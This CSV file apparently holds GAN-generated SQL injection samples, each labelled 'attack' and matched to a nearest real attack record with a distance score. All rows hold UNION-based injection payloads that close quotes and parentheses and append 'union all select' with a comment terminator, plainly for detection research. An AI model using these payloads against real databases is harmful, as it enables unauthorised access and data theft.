id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,3.6414892132921417
GAN_000002,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.883407240089205
GAN_000003,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.244425923092719
GAN_000004,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.489251386935718
GAN_000005,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.454982205285248
GAN_000006,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.557469281243534
GAN_000007,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.286301458049131
GAN_000008,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.742217856103117
GAN_000009,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.626276906389196
GAN_000010,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.5938066614832618
GAN_000011,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3332516902052642
GAN_000012,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6075734375247017
GAN_000013,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0912002943931713
GAN_000014,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4066358108673978
GAN_000015,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.436553632137332
GAN_000016,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1358377897878897
GAN_000017,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3398577508512584
GAN_000018,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.48549831025926
GAN_000019,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5031203683106322
GAN_000020,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.7134765569268526
GAN_000021,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.83136506703624
GAN_000022,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5121999214541058
GAN_000023,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.309713136705381
GAN_000024,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.846156267218404
GAN_000025,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.7381127810678167
GAN_000026,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2056400400968075
GAN_000027,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2302612438691445
GAN_000028,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5308174482440133
GAN_000029,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3108793336122804
